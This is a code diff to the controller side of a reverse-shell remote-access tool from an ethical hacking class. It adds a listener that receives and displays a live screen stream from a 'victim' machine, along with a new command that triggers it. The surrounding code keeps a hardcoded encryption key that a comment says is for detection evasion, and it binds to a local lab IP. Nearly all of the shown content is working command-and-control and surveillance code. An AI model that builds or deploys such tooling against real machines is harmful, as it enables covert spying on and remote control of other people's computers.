@@ -1,5 +1,5 @@
 ################################################
-# Authors: Korn D.,                            #
+# Authors: Korn D., Krittanut Y.,              #
 # Class: SIIT Ethical Hacking, 2023-2024       #
 ################################################
 
@@ -9,6 +9,9 @@ import socket  # This library is used for creating socket connections.
 import json  # JSON is used for encoding and decoding data in a structured format.
 import os  # This library allows interaction with the operating system.
 from cryptography.fernet import Fernet  # Encrypted communication for detection evasion
+import cv2 # (OpenCV) shows the image in a live window.
+import numpy as np # helps decode the raw JPEG bytes into an image array.
+import threading
 
 # Pre-shared key for encryption
 psk_aes = b'-SDf80BDeTTeY7jFiydQshGVwpufGx4S9J2sANAJWrI=' # Hardcoded cuz I couldn't careless :P
@@ -66,6 +69,38 @@ def download_file(file_name):
     # Close the local file after downloading is complete.
     f.close()
 
+# Listens for incoming image data from the victim.
+def receive_screen_stream():
+    stream_sock = socket.socket() # Create a TCP socket
+    stream_sock.bind(('0.0.0.0', 9999)) # Bind it to port 9999, accept the victim’s stream connection
+    stream_sock.listen(1)
+    conn, addr = stream_sock.accept()
+    print(f"[+] Live screen stream from {addr}")
+
+    try:
+        while True: # Start reading frames in a loop.
+            size_data = conn.recv(4) # Read the 4-byte size prefix.
+            if not size_data:
+                break
+            size = int.from_bytes(size_data, 'big') # Convert it back into an integer (JPEG image length).
+            data = b''
+            while len(data) < size: # Read the full image payload based on the size prefix.
+                packet = conn.recv(size - len(data))
+                if not packet:
+                    break
+                data += packet # Append until the complete image is received.
+
+            img_array = np.frombuffer(data, dtype=np.uint8) # Convert raw JPEG bytes into a numpy array
+            frame = cv2.imdecode(img_array, cv2.IMREAD_COLOR) # Decode into a color image (OpenCV format)
+            if frame is not None:
+                resized = cv2.resize(frame, (1280, 720))  # Change size of window
+                cv2.imshow("Live Screen", resized) # Display the image in a window named Live Screen
+                if cv2.waitKey(1) == ord('q'): # If the user presses q, stop the stream
+                    break
+    finally:
+        conn.close()
+        cv2.destroyAllWindows()
+
 
 # Function for the main communication loop with the target
 def target_communication():
@@ -100,6 +135,11 @@ def target_communication():
             else:
                 # If the screenshot command fails, print an error message.
                 print('[-] Failed to take screenshot.')
+        elif command == 'screen_stream':
+            threading.Thread(target=receive_screen_stream, daemon=True).start()
+            print('[*] Waiting for live stream...')  # target will send after this
+            result = reliable_recv()
+            print(result)
         else:
             # For other commands, receive and print the result from the target.
             result = reliable_recv()
@@ -110,7 +150,7 @@ def target_communication():
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Bind the socket to a specific IP address ('192.168.1.12') and port (5555).
-sock.bind(('192.168.210.143', 5555))
+sock.bind(('192.168.56.101', 5555))
 
 # Start listening for incoming connections (maximum 5 concurrent connections).
 print('[+] Listening For The Incoming Connections')
